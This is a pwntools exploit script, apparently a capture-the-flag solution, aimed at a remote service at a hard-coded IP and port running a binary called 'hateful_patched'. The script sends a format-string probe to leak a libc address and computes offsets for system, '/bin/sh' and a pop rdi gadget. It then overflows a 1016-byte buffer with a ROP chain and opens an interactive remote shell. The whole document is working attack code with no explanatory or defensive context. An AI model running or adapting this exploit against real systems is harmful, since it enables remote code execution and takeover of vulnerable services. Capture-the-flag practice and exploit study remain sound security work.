from pwn import *

p = remote('52.59.124.14', 5020)
e = ELF('./hateful_patched')
libc = ELF('./libc.so.6')

# Leak libc first, then ROP
p.sendlineafter(b'>> ', b'yay')
p.sendlineafter(b'>> ', b'%5$p')
p.recvuntil(b'email provided: ')
leaked = int(p.recvn(14), 16)
libc.address  = leaked - 0x1d2a80

system = libc.address + 0x4c490
binsh = libc.address + 0x196031
pop_rdi = libc.address + 0x277e5

# info("Pop rdi: %#x", pop_rdi)   
info("Libc address: %#x", libc.address)   
info("System address: %#x", system)   
info("POp rdi: %#x", pop_rdi)   
info("Binsh: %#x", binsh)   
print(hex(leaked))
ret = 0x000000000040101a

payload = b'A' * 1016 + p64(ret) + p64(pop_rdi) + p64(binsh)  + p64(system)
p.sendlineafter(b'now please provide the message!', payload)

p.interactive()